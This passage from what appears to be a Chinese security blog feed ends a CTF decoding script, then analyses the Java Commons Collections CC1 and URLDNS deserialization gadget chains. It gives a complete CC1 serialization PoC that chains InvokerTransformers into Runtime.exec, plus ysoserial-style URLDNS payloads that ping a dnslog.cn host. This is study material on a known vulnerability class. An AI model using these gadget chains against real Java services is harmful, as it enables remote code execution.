class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    result = <span class="built_in">open</span>(<span class="string">&#x27;output.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).readlines()[<span class="number">0</span>] </span><br><span class="line"></span><br><span class="line">    h = <span class="number">0</span></span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> h &lt; <span class="built_in">len</span>(result): </span><br><span class="line">        <span class="keyword">try</span>: </span><br><span class="line">            flag += result[h+<span class="number">1</span>] + result[h] </span><br><span class="line">        <span class="keyword">except</span>: </span><br><span class="line">            flag += result[h] </span><br><span class="line">        h += <span class="number">2</span> </span><br><span class="line">    </span><br><span class="line">    flag = <span class="built_in">list</span>(flag)</span><br><span class="line">    flag.reverse()</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span>.join(flag)</span><br><span class="line">    print(flag)</span><br><span class="line"></span><br><span class="line">    seed(<span class="number">10</span>)</span><br><span class="line">    fake_random = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(result)):</span><br><span class="line">        fake_random.append(randint(<span class="number">0</span>, <span class="number">5</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># fake_random.reverse()</span></span><br><span class="line">    new_flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">        new_flag += <span class="built_in">chr</span>(<span class="built_in">ord</span>(flag[i]) + fake_random[i])</span><br><span class="line">    </span><br><span class="line">    print(new_flag)</span><br><span class="line"></span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(new_flag)):</span><br><span class="line">        flag += <span class="built_in">chr</span>(<span class="built_in">ord</span>(new_flag[i]) ^ i)</span><br><span class="line">    </span><br><span class="line">    print(flag)</span><br><span class="line">    </span><br><span class="line">    flag = <span class="built_in">list</span>(flag)</span><br><span class="line">    flag.reverse()</span><br><span class="line">    flag = <span class="string">&quot;&quot;</span>.join(flag)</span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure><p>有个坑点，就是python2和python3的种子会有差异，要用python3来跑这个脚本</p>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> web </tag>
            
            <tag> misc </tag>
            
            <tag> write up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java-Ser-CC1</title>
      <link href="2023/07/16/Java-Ser-CC1/"/>
      <url>2023/07/16/Java-Ser-CC1/</url>
      
        <content type="html"><![CDATA[<h2 id="链条分析"><a href="#链条分析" class="headerlink" title="链条分析"></a>链条分析</h2><p>重点关注Transformer类的transform方法，然后在InvokerTransformer类中对其进行了实现，发现里面有反射调用，并且所需的参数全部由用户可控。这个可以当做sink：</p><p><img src="https://s2.loli.net/2023/07/16/mAHuQ9v6JErYqwS.png" alt=""></p><p>看一下谁调用了transform方法，这条链我们重点关注checkSetValue这个点：</p><p><img src="https://s2.loli.net/2023/07/16/Af195OBd83hSzMm.png" alt=""></p><p>找到了在TransformedMap类中，checkSetValue函数调用了valueTransformer的transform方法：</p><p><img src="https://s2.loli.net/2023/07/16/GFXIbwtqQJpD5ZS.png" alt=""></p><p>去观察它的构造函数：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//-----------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Constructor that wraps (not copies).</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * If there are any elements already in the collection being decorated, they</span></span><br><span class="line"><span class="comment"> * are NOT transformed.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> map  the map to decorate, must not be null</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> keyTransformer  the transformer to use for key conversion, null means no conversion</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> valueTransformer  the transformer to use for value conversion, null means no conversion</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IllegalArgumentException if map is null</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="title">TransformedMap</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>(map);</span><br><span class="line">    <span class="keyword">this</span>.keyTransformer = keyTransformer;</span><br><span class="line">    <span class="keyword">this</span>.valueTransformer = valueTransformer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>是保护方法，且valueTransformer可控，然后观察到里面有静态方法decorate，可以new一个TransformedMap类出来：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Factory method to create a transforming map.</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * If there are any elements already in the map being decorated, they</span></span><br><span class="line"><span class="comment"> * are NOT transformed.</span></span><br><span class="line"><span class="comment"> * Constrast this with &#123;<span class="doctag">@link</span> #decorateTransform&#125;.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> map  the map to decorate, must not be null</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> keyTransformer  the transformer to use for key conversion, null means no transformation</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> valueTransformer  the transformer to use for value conversion, null means no transformation</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IllegalArgumentException if map is null</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> TransformedMap(map, keyTransformer, valueTransformer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后继续跟进，寻找谁调用了checkSetValue方法，发现在AbstractInputCheckedMapDecorator类里面的setValue方法调用了checkSetValue，并且AbstractInputCheckedMapDecorator是TransformedMap的父类：</p><p><img src="https://s2.loli.net/2023/07/16/qpMaFl71NDW4zKu.png" alt=""></p><p>所以如果我们调用decorate方法，new出来一个TransformedMap对象，并且构造valueTransformer的值，然后在遍历entry时，调用其setValue方法，最终会调用到checkSetValue方法，然后在checkSetValue中调用transform方法，最终执行反射调用。</p><p>poc：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CC1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InvocationTargetException, IllegalAccessException, NoSuchMethodException </span>&#123;</span><br><span class="line">        Runtime r = Runtime.getRuntime();</span><br><span class="line"></span><br><span class="line">        InvokerTransformer invokerTransformer = (InvokerTransformer) <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;/Applications/iTerm.app/Contents/MacOS/iTerm2&quot;</span>&#125;);</span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;1&quot;</span>, <span class="string">&quot;2&quot;</span>);</span><br><span class="line">        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map, <span class="keyword">new</span> Transformer() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, invokerTransformer);</span><br><span class="line">        <span class="keyword">for</span> (Map.Entry entry : transformedMap.entrySet()) &#123;</span><br><span class="line">            entry.setValue(r);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面寻找哪个位置调用了setValue方法，然后可以发现AnnotationInvocationHandler这个类中的readObject发生了重写，并且调用了setValue方法，只不过有if条件需要我们进行绕过：</p><p><img src="https://s2.loli.net/2023/07/16/gZyf4F1MoXwRi3s.png" alt=""></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check to make sure that types have not evolved incompatibly</span></span><br><span class="line"></span><br><span class="line">    AnnotationType annotationType = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        annotationType = AnnotationType.getInstance(type);</span><br><span class="line">    &#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</span><br><span class="line">        <span class="comment">// Class is no longer an annotation type; time to punch out</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> java.io.InvalidObjectException(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If there are annotation members without values, that</span></span><br><span class="line">    <span class="comment">// situation is handled by the invoke method.</span></span><br><span class="line">    <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">        String name = memberValue.getKey();</span><br><span class="line">        Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">        <span class="keyword">if</span> (memberType != <span class="keyword">null</span>) &#123;  <span class="comment">// i.e. member still exists</span></span><br><span class="line">            Object value = memberValue.getValue();</span><br><span class="line">            <span class="keyword">if</span> (!(memberType.isInstance(value) ||</span><br><span class="line">                  value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                memberValue.setValue(</span><br><span class="line">                    <span class="keyword">new</span> AnnotationTypeMismatchExceptionProxy(</span><br><span class="line">                        value.getClass() + <span class="string">&quot;[&quot;</span> + value + <span class="string">&quot;]&quot;</span>).setMember(</span><br><span class="line">                            annotationType.members().get(name)));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>AnnotationInvocationHandler的构造方法，注意到AnnotationInvocationHandler这个类不是公共类，所有需要反射调用：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; type, Map&lt;String, Object&gt; memberValues) &#123;</span><br><span class="line">    Class&lt;?&gt;[] superInterfaces = type.getInterfaces();</span><br><span class="line">    <span class="keyword">if</span> (!type.isAnnotation() ||</span><br><span class="line">        superInterfaces.length != <span class="number">1</span> ||</span><br><span class="line">        superInterfaces[<span class="number">0</span>] != java.lang.annotation.Annotation.class)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> AnnotationFormatError(<span class="string">&quot;Attempt to create proxy for a non-annotation type.&quot;</span>);</span><br><span class="line">    <span class="keyword">this</span>.type = type;</span><br><span class="line">    <span class="keyword">this</span>.memberValues = memberValues;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后编写命令执行语句，命令执行的反射方法编写（Runtime类无法被序列化）：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Method getMethod = (Method) <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">null</span>&#125;).transform(Runtime.class);</span><br><span class="line">       Runtime r = (Runtime) <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">null</span>&#125;).transform(getMethod);</span><br><span class="line">       <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;/Applications/iTerm.app/Contents/MacOS/iTerm2&quot;</span>&#125;).transform(r);</span><br></pre></td></tr></table></figure><p>当然，也可以用CC提供的ChainedTransformer，更加方便：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;/Applications/iTerm.app/Contents/MacOS/iTerm2&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line">ChainedTransformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">chainedTransformer.transform(Runtime.class);</span><br></pre></td></tr></table></figure><p>然后根据之前提到的AnnotationInvocationHandler的readObject方法，里面是有一些条件判断语句的，我们需要进行bypass，调试可知memberType不能为空，即我们传入的注解类中成员变量的值不能为空。</p><p>然后还注意到在readObject里面，setValue值变成了一个AnnotationTypeMismatchExceptionProxy类，这个地方依旧需要bypass：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">memberValue.setValue(</span><br><span class="line">     <span class="keyword">new</span> AnnotationTypeMismatchExceptionProxy(</span><br><span class="line">         value.getClass() + <span class="string">&quot;[&quot;</span> + value + <span class="string">&quot;]&quot;</span>).setMember(</span><br><span class="line">             annotationType.members().get(name)));</span><br></pre></td></tr></table></figure><p>bypass的思路是，我们调用memberValue的setValue方法，最终会调用到transform方法，在transform方法的实现类中，有一个ConstantTransformer类，无论transform什么类，都会返回iConstant属性：</p><p><img src="https://s2.loli.net/2023/07/16/atcXWmTFGkUz375.png" alt=""></p><p>这样所具备的元素我们就找齐了。</p><h2 id="POC编写"><a href="#POC编写" class="headerlink" title="POC编写"></a>POC编写</h2><p>序列化：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> CC;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CC1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InvocationTargetException, IllegalAccessException, NoSuchMethodException, ClassNotFoundException, InstantiationException, IOException </span>&#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;/Applications/iTerm.app/Contents/MacOS/iTerm2&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map, <span class="keyword">null</span>, chainedTransformer);</span><br><span class="line">        Class&lt;?&gt; c = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; declaredConstructor = c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        declaredConstructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object o = declaredConstructor.newInstance(Target.class, transformedMap);</span><br><span class="line">        ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;cc1.ser&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(o);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>URLDNS链分析</title>
      <link href="2023/07/14/Java-Ser-URLDNS/"/>
      <url>2023/07/14/Java-Ser-URLDNS/</url>
      
        <content type="html"><![CDATA[<h2 id="调用链跟踪"><a href="#调用链跟踪" class="headerlink" title="调用链跟踪"></a>调用链跟踪</h2><p>这条链的起始是采用了HashMap作为入口，为什么采用HashMap作为入口？</p><p>首先HashMap是可以被序列化的：</p><p><img src="https://s2.loli.net/2023/07/14/noSbylfJQGzcEF3.png" alt=""></p><p>然后序列化的时候会调用HashMap重写的readObject方法，在readObject方法的最后调用了hash函数计算key的哈希值：</p><p><img src="https://s2.loli.net/2023/07/14/GD8ByNkbnScd4h3.png" alt=""></p><p>在hash函数中，会调用key的hashCode方法：</p><p><img src="https://s2.loli.net/2023/07/14/LeKIDroOgA9x3uq.png" alt=""></p><p>然后再URL类中，存在同名方法hashCode：</p><p><img src="https://s2.loli.net/2023/07/14/1ruwinDHh32soUy.png" alt=""></p><p>跟进去，发现会调用getHostAddress方法，此方法将会进行一次DNS查询。</p><p><img src="https://s2.loli.net/2023/07/14/VXJElypZv9mQ4dR.png" alt=""></p><p>因此调用链如下：</p><blockquote><p>HashMap-&gt;readObject()</p><p>​    hash()</p><p>​        URL-&gt;hashCode()</p><p>​            getHostAddress()</p></blockquote><p>ysoserial的URLDNS链如下：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.payloads;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.URLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.URLStreamHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Authors;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Dependencies;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.PayloadTest;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.PayloadRunner;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.Reflections;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * A blog post with more details about this gadget chain is at the url below:</span></span><br><span class="line"><span class="comment"> *   https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   This was inspired by  Philippe Arteau <span class="doctag">@h</span>3xstream, who wrote a blog</span></span><br><span class="line"><span class="comment"> *   posting describing how he modified the Java Commons Collections gadget</span></span><br><span class="line"><span class="comment"> *   in ysoserial to open a URL. This takes the same idea, but eliminates</span></span><br><span class="line"><span class="comment"> *   the dependency on Commons Collections and does a DNS lookup with just</span></span><br><span class="line"><span class="comment"> *   standard JDK classes.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   The Java URL class has an interesting property on its equals and</span></span><br><span class="line"><span class="comment"> *   hashCode methods. The URL class will, as a side effect, do a DNS lookup</span></span><br><span class="line"><span class="comment"> *   during a comparison (either equals or hashCode).</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   As part of deserialization, HashMap calls hashCode on each key that it</span></span><br><span class="line"><span class="comment"> *   deserializes, so using a Java URL object as a serialized key allows</span></span><br><span class="line"><span class="comment"> *   it to trigger a DNS lookup.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   Gadget Chain:</span></span><br><span class="line"><span class="comment"> *     HashMap.readObject()</span></span><br><span class="line"><span class="comment"> *       HashMap.putVal()</span></span><br><span class="line"><span class="comment"> *         HashMap.hash()</span></span><br><span class="line"><span class="comment"> *           URL.hashCode()</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@SuppressWarnings(&#123; &quot;rawtypes&quot;, &quot;unchecked&quot; &#125;)</span></span><br><span class="line"><span class="meta">@PayloadTest(skip = &quot;true&quot;)</span></span><br><span class="line"><span class="meta">@Dependencies()</span></span><br><span class="line"><span class="meta">@Authors(&#123; Authors.GEBL &#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">URLDNS</span> <span class="keyword">implements</span> <span class="title">ObjectPayload</span>&lt;<span class="title">Object</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//Avoid DNS resolution during payload creation</span></span><br><span class="line">                <span class="comment">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span></span><br><span class="line">                URLStreamHandler handler = <span class="keyword">new</span> SilentURLStreamHandler();</span><br><span class="line"></span><br><span class="line">                HashMap ht = <span class="keyword">new</span> HashMap(); <span class="comment">// HashMap that will contain the URL</span></span><br><span class="line">                URL u = <span class="keyword">new</span> URL(<span class="keyword">null</span>, url, handler); <span class="comment">// URL to use as the Key</span></span><br><span class="line">                ht.put(u, url); <span class="comment">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span></span><br><span class="line"></span><br><span class="line">                Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>); <span class="comment">// During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> ht;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                PayloadRunner.run(URLDNS.class, args);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         ......</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title">URLStreamHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">                <span class="function"><span class="keyword">protected</span> URLConnection <span class="title">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="function"><span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title">getHostAddress</span><span class="params">(URL u)</span> </span>&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后注意到中间集成了一个URLStreamHandler类，然后还进行了一次反射，这是因为，最开始调用put的时候，为了不触发URLDNS，就重写了这个getHostAddress方法，返回一个null；进行反射是因为我们要想走进去调用链，URL的hashCode属性必须为-1，最开始的时候调用put函数，哈希值被计算了一次，此时的hashCode被改掉了，所以需要反射修改。</p><h2 id="自己写个链"><a href="#自己写个链" class="headerlink" title="自己写个链"></a>自己写个链</h2><p>首先我们先看如果不继承的话会出现什么情况：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DNS</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        HashMap&lt;URL, Integer&gt; hashmap = <span class="keyword">new</span> HashMap&lt;URL, Integer&gt;();</span><br><span class="line">        URL url = <span class="keyword">new</span> URL(<span class="string">&quot;http://3dsmkp.dnslog.cn/&quot;</span>);</span><br><span class="line">        hashmap.put(url, <span class="number">1</span>);</span><br><span class="line">      </span><br><span class="line">        ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;URL.ser&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(hashmap);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时的hashCode为-1，因此会发起一次dns请求：</p><p><img src="https://s2.loli.net/2023/07/14/PLwdCAt1Kg9yOf7.png" alt=""></p><p>然后等到我们准备序列化写入文件时，此时的hashCode的值已经被哈希覆写掉了：</p><p><img src="https://s2.loli.net/2023/07/14/epWkuXqjLB35CEx.png" alt=""></p><p>那么可想而知，当我们反序列化的时候，必定不会成功，因为hashCode的值不再是-1了。</p><p>那么除了继承方法外，还可以怎么做呢？其实还可以提前用反射的方法对hashCode的值进行篡改，当我们put完之后，再把hashCode的值改回-1：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DNS</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception 